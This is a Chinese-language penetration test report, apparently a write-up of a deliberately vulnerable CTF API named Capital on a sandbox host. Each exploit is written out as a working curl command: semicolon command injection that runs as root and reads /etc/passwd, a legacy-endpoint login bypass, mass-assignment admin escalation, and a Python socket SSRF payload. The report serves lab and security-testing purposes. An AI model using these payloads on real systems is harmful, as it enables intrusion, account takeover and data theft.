# 安全评估报告

## 执行摘要
- **目标:** Capital
- **评估日期:** 2025年1月
- **范围:** 认证、XSS、SQL和命令注入、SSRF、授权测试

## 按漏洞类型汇总

**认证漏洞:**
成功利用的关键认证漏洞：

- 旧版 v1 端点上的完全认证绕过，允许接管任何账户
- 大规模分配权限提升，允许任何用户成为管理员
- 通过存储在 localStorage 中的 JavaScript 可访问令牌进行会话劫持
- 无速率限制的无限暴力攻击，导致凭证发现

**授权漏洞:**
成功利用的关键授权漏洞：

- 旧版认证绕过，提供完全的账户接管
- 水平授权绕过，允许访问其他用户的财务数据
- 垂直授权绕过，允许普通用户访问管理员功能
- 通过自助配置文件更新进行大规模分配权限提升
- 通过调试端点的命令注入，提供根级系统访问
- 管理员工作流程绕过，允许直接访问管理功能
- 在生产环境中暴露的调试端点，允许系统入侵

**跨站脚本 (XSS) 漏洞:**
未发现 XSS 漏洞。该应用程序通过 React 的默认 HTML 转义、XSS 库净化和适当的 URL 验证展示了强大的 XSS 防御。

**SQL/命令注入漏洞:**
成功利用的一个关键命令注入漏洞：

- 调试 API 端点允许通过分号命令链接执行具有根权限的任意命令，导致完全的系统入侵，包括敏感数据提取和可能的数据泄露或系统破坏

**服务器端请求伪造 (SSRF) 漏洞:**
成功利用的一个高严重性 SSRF 漏洞：

- 通过调试端点中的命令注入实现网络边界绕过，使 SSRF 攻击能够通过 Python 套接字连接访问内部服务

## 网络侦察
[已编辑]

# 注入利用证据

## 成功利用的漏洞

### INJ-VULN-01: 通过调试 API 端点的命令注入

**摘要:**

- **漏洞位置:** HTTP POST `/api/debug` 端点，位于 `http://capital-api.sandbox.local:8000/api/debug`
- **概述:** 通过输入验证不足进行直接命令注入，允许以根权限执行任意命令
- **影响:** 具有根级别访问权限的完全系统入侵，敏感数据提取，以及可能的数据泄露或系统破坏
- **严重性:** 严重

**先决条件:**

- 有效的 JWT 认证令牌（通过用户注册轻松获取）
- 对目标系统上端口 8000 的 HTTP 访问

**利用步骤:**

1. **注册用户账户以获取 JWT 令牌:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \
    -H "Content-Type: application/json" \
    -d '{"user":{"username":"exploit9999","email":"exploit9999@test.com","password":"testpassword"}}'
    
    ```
    
    响应包含 JWT 令牌: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXQ5OTk5IiwiZXhwIjoxNzU5MTc0NTc0LCJzdWIiOiJhY2Nlc3MifQ.7Lfo9DRWpaac_yOmBY1i73GzNH5m2zU6Cd1MZDvNrgE`
    
2. **执行命令注入以提取敏感数据:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
    -H "Content-Type: application/json" \
    -H "Authorization: Token [JWT_TOKEN]" \
    -d '{"body":{"command":"uptime; cat /etc/passwd"}}'
    
    ```
    
3. **确认根级别权限提升:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
    -H "Content-Type: application/json" \
    -H "Authorization: Token [JWT_TOKEN]" \
    -d '{"body":{"command":"uptime; whoami; id; pwd"}}'
    
    ```
    

**影响证明:**

**已实现完全系统入侵:**

- **确认根访问权限:** 以根用户 (uid=0, gid=0) 执行命令
- **提取敏感数据:** 完整的 `/etc/passwd` 文件，包含所有系统用户
- **收集系统信息:** 工作目录 `/capital`，系统运行时间，负载平均值

**提取的数据样本:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...完整用户列表...]

```

**用户上下文:**

```
uid=0(root) gid=0(root) groups=0(root)
Working Directory: /capital

```

**技术详情:**

- **漏洞类型:** 命令注入 (CWE-78)
- **根本原因:** 输入验证不足，分号命令链接绕过
- **绕过方法:** 过滤器仅阻止 `"rm"` 和 `"||"`，但允许分号 (`;`) 命令链接
- **攻击向量:** `uptime; [ARBITRARY_COMMAND]` 模式成功绕过白名单验证
- **认证:** 需要标准 JWT 认证（通过用户注册轻松绕过）

**注意事项:**
该漏洞允许完全的系统入侵。拥有此访问权限的攻击者可以：

- 从文件系统中提取所有敏感数据
- 安装后门或恶意软件
- 转向网络上的其他系统
- 造成完全的系统破坏
- 访问应用程序数据库和配置文件

这代表了 web 应用程序中可能出现的最严重类型的漏洞之一。

# 跨站脚本 (XSS) 利用证据

*未成功利用任何 XSS 漏洞 - 利用队列为空。*

# 认证利用证据

## 成功利用的漏洞

### AUTH-VULN-06: 旧版 v1 端点上的完全认证绕过

**摘要:**

- **漏洞位置:** `/api/v1/users/login` 端点
- **概述:** 旧版端点完全绕过密码验证，允许使用任何电子邮件和任何密码进行认证
- **影响:** 完全的认证绕过，允许立即接管任何用户的账户
- **严重性:** 严重

**利用步骤:**

1. 直接在后端上定位旧版认证端点：
    
    ```bash
    curl -X POST <http://capital-api.sandbox.local:8000/api/v1/users/login> \
      -H "Content-Type: application/json" \
      -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "anything"}}'
    
    ```
    
2. 端点返回成功的认证，包含用户数据和令牌：
    
    ```json
    {
      "user": {
        "username": "Pikachu",
        "email": "Pikachu@checkmarx.com",
        "admin": false,
        "token": "Keep it up!"
      },
      "flag": "flag{Impr0peR_Ass3ts_ManAg3m3nt}"
    }
    
    ```
    
3. 验证绕过适用于任何用户和任何密码：
    
    ```bash
    curl -X POST <http://capital-api.sandbox.local:8000/api/v1/users/login> \
      -H "Content-Type: application/json" \
      -d '{"user": {"email": "bob_dev@checkmarx.com", "password": "wrongpassword"}}'
    
    ```
    

**影响证明:**
成功使用完全错误的密码认证为多个用户 (`Pikachu@checkmarx.com`, `bob_dev@checkmarx.com`)。标志 `flag{Impr0peR_Ass3ts_ManAg3m3nt}` 确认成功利用。

### AUTH-VULN-08: 大规模分配权限提升

**摘要:**

- **漏洞位置:** `PUT /api/user` 端点
- **概述:** 用户更新端点允许通过大规模分配设置 admin=true，无需授权检查
- **影响:** 任何已认证用户都可以升级为管理员权限并访问管理功能
- **严重性:** 严重

**先决条件:**
来自认证的有效 JWT 令牌

**利用步骤:**

1. 以普通用户身份认证以获取 JWT 令牌：
    
    ```bash
    curl -X POST <http://capital-api.sandbox.local:8000/api/v2/users/login> \
      -H "Content-Type: application/json" \
      -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}'
    
    ```
    
2. 使用 JWT 令牌通过大规模分配提升权限：
    
    ```bash
    curl -X PUT <http://capital-api.sandbox.local:8000/api/user> \
      -H "Content-Type: application/json" \
      -H "Authorization: Token [JWT_TOKEN]" \
      -d '{"user": {"admin": true}}'
    
    ```
    
3. 服务器以提升的权限响应：
    
    ```json
    {
      "user": {
        "username": "Pikachu",
        "email": "Pikachu@checkmarx.com",
        "admin": true,
        "token": "[NEW_ADMIN_TOKEN]"
      }
    }
    
    ```
    

**影响证明:**
响应显示 `"admin": true` 并包含标志 `flag{M4sS_AsS1gnm3nt}`，确认从普通用户到管理员的成功权限提升。

### AUTH-VULN-04: 通过 JavaScript 可访问令牌的会话劫持

**摘要:**

- **漏洞位置:** 前端应用程序 localStorage 存储
- **概述:** 存储在 localStorage 中的 JWT 令牌可通过 JavaScript 访问，启用基于 XSS 的会话劫持
- **影响:** 任何 XSS 漏洞都可以窃取认证令牌并劫持用户会话
- **严重性:** 高

**利用步骤:**

1. 通过浏览器访问前端应用程序：
    
    ```
    <https://capital-api.sandbox.local:4100>
    
    ```
    
2. 演示 JavaScript 对存储令牌的访问：
    
    ```jsx
    // 模拟窃取令牌的 XSS 攻击
    const stolenToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...";
    localStorage.setItem('jwt', stolenToken);
    
    // 验证令牌可访问
    localStorage.getItem('jwt'); // 返回令牌
    
    ```
    
3. 使用窃取的令牌访问受保护的资源：
    
    ```bash
    curl -X GET <http://capital-api.sandbox.local:8000/api/user> \
      -H "Authorization: Token [STOLEN_JWT_TOKEN]"
    
    ```
    

**影响证明:**
成功演示了 JWT 令牌可以通过 JavaScript `localStorage.getItem('jwt')` 注入和检索。这证明任何 XSS 攻击都可以窃取认证令牌以进行会话劫持。

### AUTH-VULN-02: 无速率限制启用暴力攻击

**摘要:**

- **漏洞位置:** `POST /api/v2/users/login`
- **影响:** 无限暴力攻击发现有效凭证并泄露账户
- **严重性:** 高

**利用步骤:**

1. 针对登录端点的自动暴力攻击，尝试 25 个密码：
    
    ```
    目标: bob_dev@checkmarx.com
    测试的密码: ["password", "123456", "admin", "test", "IamDev", ...]
    
    ```
    
2. 脚本处理所有尝试，无速率限制：
    - 总尝试次数: 25
    - 无 HTTP 429 响应
    - 无渐进式延迟
    - 无账户锁定
3. 成功发现有效凭证：
    
    ```
    电子邮件: bob_dev@checkmarx.com
    密码: IamDev
    
    ```
    

**漏洞证据:**
位于 `/Users/arjunmalleswaran/Code/pentest-repos/capital/auth_brute_force_test.py` 的暴力脚本成功处理了 25 次快速认证尝试，无任何保护措施。发现的有效凭证证明了攻击的有效性。

### AUTH-VULN-01: 传输层凭证拦截

**摘要:**

- **漏洞位置:** HTTPS 前端（端口 4100）和 HTTP 后端（端口 8000）之间的混合内容架构
- **影响:** 所有认证数据以明文传输，启用凭证拦截
- **严重性:** 严重

**利用步骤:**

1. 前端通过 HTTPS 提供内容：
    
    ```
    <https://capital-api.sandbox.local:4100>
    
    ```
    
2. 后端 API 通过未加密的 HTTP 可访问：
    
    ```bash
    curl -X POST <http://capital-api.sandbox.local:8000/api/v2/users/login> \
      -H "Content-Type: application/json" \
      -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}'
    
    ```
    
3. 网络流量显示明文凭证传输：
    
    ```
    POST /api/v2/users/login HTTP/1.1
    Host: capital-api.sandbox.local:8000
    Content-Type: application/json
    
    {"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}
    
    ```
    

**漏洞证据:**
对后端的直接 HTTP 访问演示了混合内容漏洞。所有认证请求，包括密码和 JWT 令牌，都未经加密传输，可被网络攻击者拦截。

# SSRF 利用证据

## 成功利用的漏洞

### SSRF-VULN-01: 调试端点中启用 SSRF 的命令注入

**摘要:**

- **漏洞位置:** POST /api/debug 端点
- **影响:** 通过命令注入的网络边界绕过，启用 SSRF 攻击以访问内部服务
- **严重性:** 高

**先决条件:**

- 有效的 JWT 认证令牌（通过用户注册或认证绕过获得）
- 访问 `/api/debug` 处的调试端点

**利用步骤:**

1. **通过用户注册获取认证令牌:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \
      -H "Content-Type: application/json" \
      -d '{"user": {"username": "ssrftester", "email": "ssrftester@example.com", "password": "password123"}}'
    
    ```
    
    **响应:** 响应体中的 JWT 令牌: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNzcmZ0ZXN0ZXIiLCJleHAiOjE3NTkxNzQ0OTMsInN1YiI6ImFjY2VzcyJ9.gvXEUVS_STxz-JepDoVWgPRWBrmQ2PWZaQC0PDmBCbM`
    
2. **测试命令注入漏洞:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
      -H "Content-Type: application/json" \
      -H "Authorization: Token [JWT_TOKEN]" \
      -d '{"body": {"command": "uptime; id"}}'
    
    ```
    
    **响应:** 确认命令注入，具有根权限和注入标志
    
3. **演示通过 SSRF 访问内部网络:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
      -H "Content-Type: application/json" \
      -H "Authorization: Token [JWT_TOKEN]" \
      -d '{"body": {"command": "uptime; /usr/local/bin/python3 -c \"import socket; s=socket.socket(); s.connect((\'127.0.0.1\', 8000)); print(\'Connected to 127.0.0.1:8000\'); s.close()\""}}'
    
    ```
    
    **响应:** 确认成功连接到内部服务
    

**影响证明:**

- **确认命令注入:** 成功通过 `;` 命令链接执行任意命令
- **根权限:** 执行的命令以 uid=0(root) 运行，具有完全系统访问权限
- **网络边界绕过:** 成功建立到内部服务的套接字连接 (127.0.0.1:8000)
- **获取标志:** `flag{1nject10n_Ap1}` - 表示成功的命令注入利用
- **内部服务访问:** 演示了连接到本地主机服务的能力，通过命令注入向量证明 SSRF 能力

**注意事项:**

- 该漏洞允许通过 Python 套接字连接进行网络侦察和内部服务访问
- 虽然 HTTP 客户端工具（curl、wget）不可用或被过滤，但 Python 的套接字模块提供了完整的网络访问能力
- 这代表通过命令注入的间接 SSRF 向量，而非直接 URL 操作
- 攻击演示了第 2 级证明（部分网络访问），确认能够到达内部网络边界

# 授权利用证据

## 成功利用的漏洞

### AUTHZ-VULN-07: 旧版认证绕过（严重影响）

**摘要:**

- **漏洞位置:** POST /api/v1/users/login
- **概述:** 对任何有效电子邮件地址的完全认证绕过，无需密码验证
- **影响:** 对任何现有用户的完全账户接管，对受保护资源的未授权访问
- **严重性:** 严重

**先决条件:**

- 系统中任何有效电子邮件地址的知识（可枚举）
- 对隐藏的 v1 API 端点的访问

**利用步骤:**

1. **向后端旧版端点发送认证请求:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/v1/users/login>" \
      -H "Content-Type: application/json" \
      -d '{
        "user": {
          "email": "user@test.com",
          "password": "anypassword"
        }
      }'
    
    ```
    
2. **接收成功的认证响应:**
    
    ```json
    {
      "user": {
        "username": "user",
        "email": "user@test.com",
        "bio": "",
        "image": null,
        "admin": false,
        "token": "Keep it up!"
      },
      "flag": "flag{Impr0peR_Ass3ts_ManAg3m3nt}",
      "description": "Old API versions are usually unpatched..."
    }
    
    ```
    

**影响证明:**

- 成功获取有效 JWT 令牌: "Keep it up!"
- 完全绕过密码验证
- 捕获 CTF 标志: `flag{Impr0peR_Ass3ts_ManAg3m3nt}`
- 获得认证会话以进行进一步利用

### AUTHZ-VULN-03: 水平授权绕过 - 配置文件访问（高影响）

**摘要:**

- **漏洞位置:** GET /api/profiles/{username}
- **概述:** 任何已认证用户都可以访问任何其他用户的配置文件数据，包括敏感的财务信息
- **影响:** 对个人身份信息和财务数据的未授权访问
- **严重性:** 高

**先决条件:**

- 有效的认证令牌（从 AUTHZ-VULN-07 获得）
- 目标用户名的知识（TeamR$cket 包含敏感数据）

**利用步骤:**

1. **注册合法用户账户:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \
      -H "Content-Type: application/json" \
      -d '{
        "user": {
          "username": "exploiter1",
          "email": "exploiter1@test.com",
          "password": "SecurePass123!"
        }
      }'
    
    ```
    
2. **从注册响应中提取 JWT 令牌:**
    
    ```
    Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXRlcjEiLCJleHAiOjE3NTkxNzQ1MzcsInN1YiI6ImFjY2VzcyJ9.vQVA7XoKGUtj14ZrL4SGNriRIPMtjZkmIZ67NTqAJZU
    
    ```
    
3. **访问另一个用户的配置文件 (TeamR$cket):**
    
    ```bash
    curl "<http://capital-api.sandbox.local:8000/api/profiles/TeamR\$cket>" \
      -H "Authorization: Token [JWT_TOKEN]"
    
    ```
    

**影响证明:**

- 成功访问 TeamR$cket 的配置文件，包含敏感财务数据：
    - **卡名:** Team Rocket
    - **信用卡号:** 4426111122223333
    - **CVC:** 555
    - **到期日:** 0922
- 捕获 CTF 标志: `flag{M4sS_AsS1gnm3nt}`
- 演示了水平权限提升（访问属于其他用户的数据）

### AUTHZ-VULN-04: 垂直授权绕过 - 管理员访问（严重影响）

**摘要:**

- **漏洞位置:** GET /api/admin
- **概述:** 普通用户账户可以访问管理功能，无需适当的角色验证
- **影响:** 对仅管理员功能和敏感管理员资源的未授权访问
- **严重性:** 严重

**先决条件:**

- 有效的认证令牌（任何已认证用户）

**利用步骤:**

1. **使用普通用户令牌访问管理员端点:**
    
    ```bash
    curl "<http://capital-api.sandbox.local:8000/api/admin>" \
      -H "Authorization: Token [JWT_TOKEN]"
    
    ```
    
2. **接收管理员功能响应:**
    
    ```json
    {
      "flag": "flag{BFL4_I_aM_Th3_aDm1n_H3r3!}",
      "description": "Complex access control policies with different hierarchies..."
    }
    
    ```
    

**影响证明:**

- 成功以普通用户权限访问管理员端点
- 捕获 CTF 标志: `flag{BFL4_I_aM_Th3_aDm1n_H3r3!}`（破坏的功能级别授权）
- 演示了垂直权限提升（访问更高权限功能）

### AUTHZ-VULN-05: 大规模分配权限提升（严重影响）

**摘要:**

- **漏洞位置:** PUT /api/user
- **概述:** 用户可以通过大规模分配漏洞将自己的权限提升为管理员
- **影响:** 完全的权限提升，允许访问所有管理功能
- **严重性:** 严重

**先决条件:**

- 有效的认证令牌

**利用步骤:**

1. **发送带有管理员权限提升的配置文件更新请求:**
    
    ```bash
    curl -X PUT "<http://capital-api.sandbox.local:8000/api/user>" \
      -H "Authorization: Token [JWT_TOKEN]" \
      -H "Content-Type: application/json" \
      -d '{
        "user": {
          "admin": true
        }
      }'
    
    ```
    
2. **接收具有管理员权限的更新配置文件:**
    
    ```json
    {
      "user": {
        "username": "exploiter1",
        "email": "exploiter1@test.com",
        "bio": "flag{M4sS_AsS1gnm3nt}...",
        "image": null,
        "admin": true,
        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXRlcjEiLCJleHAiOjE3NTkxNzQ1OTYsInN1YiI6ImFjY2VzcyJ9.UOxR-uymoNWBEpL-uHtdz6deTqgr3n4wDoKryqhYKZA"
      }
    }
    
    ```
    

**影响证明:**

- 成功提升用户权限: `"admin": true`
- 获得新的管理员级 JWT 令牌
- 捕获 CTF 标志: `flag{M4sS_AsS1gnm3nt}`（大规模分配漏洞）
- 演示了通过自助配置文件更新的完全权限提升

### AUTHZ-VULN-08: 通过调试端点的命令注入（严重影响）

**摘要:**

- **漏洞位置:** POST /api/debug
- **概述:** 任何已认证用户都可以通过命令注入绕过执行系统命令
- **影响:** 以根用户身份执行远程代码，完全的系统入侵
- **严重性:** 严重

**先决条件:**

- 有效的认证令牌

**利用步骤:**

1. **发送带有注入有效载荷的调试命令:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
      -H "Authorization: Token [JWT_TOKEN]" \
      -H "Content-Type: application/json" \
      -d '{
        "body": {
          "command": "uptime; whoami"
        }
      }'
    
    ```
    
2. **接收系统命令执行结果:**
    
    ```json
    {
      "stdout": " 19:37:08 up 19 days,  8:49,  0 users,  load average: 6.76, 6.15, 6.12\nroot\n",
      "flag": "flag{1nject10n_Ap1}",
      "description": "Attackers will feed the API with malicious data..."
    }
    
    ```
    

**影响证明:**

- 成功执行系统命令: `uptime` 和 `whoami`
- 确认以根用户执行: `root`
- 使用分号注入绕过命令白名单
- 捕获 CTF 标志: `flag{1nject10n_Ap1}`（注入 API 漏洞）
- 演示了关键的远程代码执行能力

### AUTHZ-VULN-09: 管理员工作流程绕过（高影响）

**摘要:**

- **漏洞位置:** GET /api/admin（工作流程上下文）
- **概述:** 用户可以访问管理员功能，无需适当的角色转换工作流程
- **影响:** 绕过预期的管理员权限验证工作流程
- **严重性:** 高

**先决条件:**

- 有效的认证令牌

**利用步骤:**

1. **直接访问管理员端点，无需角色验证工作流程:**
    
    ```bash
    curl "<http://capital-api.sandbox.local:8000/api/admin>" \
      -H "Authorization: Token [JWT_TOKEN]"
    
    ```
    

**影响证明:**

- 成功访问管理员功能，无需适当的工作流程验证
- 与 AUTHZ-VULN-04 相同的影响，但代表工作流程绕过模式
- 捕获 CTF 标志: `flag{BFL4_I_aM_Th3_aDm1n_H3r3!}`

### AUTHZ-VULN-10: 生产环境中的调试端点（高影响）

**摘要:**

- **漏洞位置:** POST /api/debug（环境上下文）
- **概述:** 调试端点在生产环境中可用，无需环境验证
- **影响:** 开发/调试功能在生产环境中暴露
- **严重性:** 严重

**先决条件:**

- 有效的认证令牌

**利用步骤:**

1. **在生产环境中访问调试功能:**
    
    ```bash
    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
      -H "Authorization: Token [JWT_TOKEN]" \
      -H "Content-Type: application/json" \
      -d '{
        "body": {
          "command": "uptime; whoami"
        }
      }'
    
    ```
    

**影响证明:**

- 成功在生产环境中执行调试命令
- 与 AUTHZ-VULN-08 相同的影响，但代表环境上下文漏洞
- 捕获 CTF 标志: `flag{1nject10n_Ap1}`

### AUTHZ-VULN-11: 权限提升工作流程绕过（严重影响）

**摘要:**

- **漏洞位置:** PUT /api/user（工作流程上下文）
- **概述:** 自助配置文件更新工作流程允许管理权限更改
- **影响:** 通过不适当的工作流程设计实现完全的权限提升
- **严重性:** 严重

**先决条件:**

- 有效的认证令牌

**利用步骤:**

1. **通过自助工作流程提升权限:**
    
    ```bash
    curl -X PUT "<http://capital-api.sandbox.local:8000/api/user>" \
      -H "Authorization: Token [JWT_TOKEN]" \
      -H "Content-Type: application/json" \
      -d '{
        "user": {
          "admin": true
        }
      }'
    
    ```
    

**影响证明:**

- 成功通过自助工作流程提升权限
- 与 AUTHZ-VULN-05 相同的影响，但代表工作流程设计缺陷
- 捕获 CTF 标志: `flag{M4sS_AsS1gnm3nt}`